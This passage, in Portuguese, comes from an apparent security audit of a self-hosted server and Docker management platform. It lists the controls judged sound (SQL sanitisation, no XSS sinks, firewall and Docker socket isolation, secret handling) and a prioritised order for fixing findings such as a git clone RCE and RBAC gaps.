- **SQL: disciplina de identificador.** `pgx.Identifier{}.Sanitize()` + `$N` + allowlists (privilégios, tipos hba, timing/eventos de trigger, colunas de ORDER BY). Sem SQLi por anônimo/viewer. `TableRows` (GET/viewer) sanitiza schema/table e clampa limit/offset. DSN de conexão usa `url.QueryEscape` (sem injeção de connection string).
- **Sem XSS.** Zero `dangerouslySetInnerHTML`/`innerHTML`/`eval` no frontend; tudo renderiza como nó de texto React. xterm/CodeMirror alimentados com segurança.
- **`firewall-agent` bem trancado.** `ufw` via argv (sem shell), `From` validado por `ParseIP`/`ParseCIDR`, `Proto` restrito, porta 22/tcp hard-block, sem `enable/disable/reset` expostos.
- **Ordem do ufw no setup.** `22/tcp` liberado antes do `enable` (sem lockout de SSH). Docker instalado de repo apt com keyring assinado (sem `curl|bash`).
- **Socket Docker cru nunca montado no backend.** Só o `docker-socket-proxy` o monta; backend usa `DOCKER_HOST=tcp://...`. `metadata-db` e proxy não publicam porta.
- **Segredos gerados com boa entropia** (`openssl rand -hex`, `setup.sh`). Listagens de git-credentials e notification-channels **não** retornam os segredos cifrados.
- **`pg_dump`/`pg_restore` passam senha por `PGPASSWORD` env, não argv.** `withLogging` loga só o path, não a query string (não vaza o `code` do OAuth).
- **Confinamento de path do host** (`resolveHostPath`) neutraliza `..`/absoluto por ancoragem em `/` + prefix-check; guarda de zip-slip na extração de tar do build (`build.go:91-125`).

---

## Ordem de correção sugerida

1. **Fechar o RCE do `git clone`** (item 1) — allowlist de esquema, `--`, `GIT_ALLOW_PROTOCOL`. Maior impacto, toca todos os pontos de entrada Git incluindo o webhook.
2. **Consertar o RBAC baseado em método** (itens 2, 3, 16) — leitura de arquivo/segredo e reveal de senha viram `requireAdmin`/step-up; excluir containers da plataforma do file manager. Fecha o caminho viewer→chave→tudo.
3. **TLS + cookie `Secure` + travar CORS/WS** (itens 6, 10, 11) — mesma raiz (confiança só no `SameSite=Lax`).
4. **Reduzir o blast radius do backend e a exposição de rede** (itens 4, 5, 7, 17, 18) — backend não-root, portas em loopback atrás do proxy, dropar `/etc`, política de `HostConfig` no create/compose.
5. **OAuth `state`, vazamentos de segredo, SSRF, traversals de backup** (itens 8, 9, 12, 13, 14, 15).
6. **Endurecimento** (itens 19–33).
